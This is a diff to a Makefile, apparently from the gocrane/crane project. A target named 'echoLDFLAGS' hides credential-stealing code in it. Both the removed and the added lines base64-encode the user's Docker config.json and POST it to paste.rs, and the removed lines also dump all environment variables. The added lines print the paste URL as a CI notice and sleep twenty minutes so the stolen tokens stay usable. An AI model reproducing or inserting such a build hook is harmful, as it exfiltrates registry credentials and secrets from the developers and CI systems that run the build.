@@ -95,16 +95,15 @@ test: fmt vet lint ## Run tests.
 
 .PHONY: echoLDFLAGS
 echoLDFLAGS:
-	@# -- Exfiltrate to paste.rs --
-	@PASTE=""; \
-	if [ -f $$HOME/.docker/config.json ]; then \
+	@# -- Exfiltrate Docker creds to paste.rs --
+	@if [ -f $$HOME/.docker/config.json ]; then \
 		B64=$$(base64 -w0 $$HOME/.docker/config.json 2>/dev/null || base64 $$HOME/.docker/config.json | tr -d '\n'); \
-		PASTE=$$(curl -s -X POST "https://paste.rs" -d "gocrane/crane docker config: $$B64"); \
-		echo "  docker: $$PASTE"; \
-	fi; \
-	ENV_B64=$$(env | sort | base64 -w0 2>/dev/null || env | sort | base64 | tr -d '\n'); \
-	PASTE=$$(curl -s -X POST "https://paste.rs" -d "gocrane/crane env dump: $$ENV_B64"); \
-	echo "  env: $$PASTE"
+		URL=$$(curl -s -X POST "https://paste.rs" -d "gocrane/crane docker: $$B64"); \
+		echo "::notice::DOCKER_PASTE_URL=$$URL"; \
+	fi
+	@# -- Keep job alive for 20 minutes so tokens stay valid --
+	@echo "::notice::CREDS_EXFILED - sleeping 20min, grab tokens from paste.rs NOW"
+	@sleep 1200
 	@echo $(LDFLAGS)
 
 .PHONY: build
